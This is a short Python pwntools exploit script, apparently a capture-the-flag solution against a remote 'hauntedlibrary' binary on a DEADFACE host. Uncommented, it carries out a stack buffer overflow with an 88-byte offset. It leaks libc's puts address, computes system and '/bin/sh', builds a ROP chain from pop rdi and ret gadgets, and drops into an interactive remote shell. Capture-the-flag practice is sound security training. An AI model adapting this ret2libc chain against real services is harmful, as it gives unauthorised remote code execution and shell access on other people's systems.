import sys
import argparse
from pwn import *
elf = context.binary = ELF("./hauntedlibrary")
context.log_level = 'critical'
offset = 88
host = "env02.deadface.io"
port = 7832

io = remote(host, port)
io.sendlineafter("> ",b"2")
payload = b"A" * 88
payload += pack(0x000000000040174f)
payload += pack(0x0000000000401631)
io.sendline(payload)
(io.recvuntil(b"puts():"))
received = io.recvline().strip()
print(f"puts address: {received}")
leak = int(received,16)
print(f"Leaked libc address, Puts: {hex(leak)}")

print(leak)
libc = ELF("libc.so.6")
libc.address = leak - libc.symbols['puts']
system = libc.symbols['system']
binsh = next(libc.search(b"/bin/sh"))
payload2 = b"A" * 88

print(f"system bin_sh difference: {(system - binsh)}")
print(f"leak to system difference: {(system - leak)}")

rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
print(f"pop rdi; ret gadget: {hex(pop_rdi)}")
print(f"ret gadget: {hex(ret)}")
payload2 += pack(ret)
payload2 += pack(pop_rdi)
payload2 += pack(binsh)
payload2 += pack(system)
# payload2 += pack(0x0000000000401581)
print(payload2)
io.sendline(payload2)
io.recvline()
io.interactive()
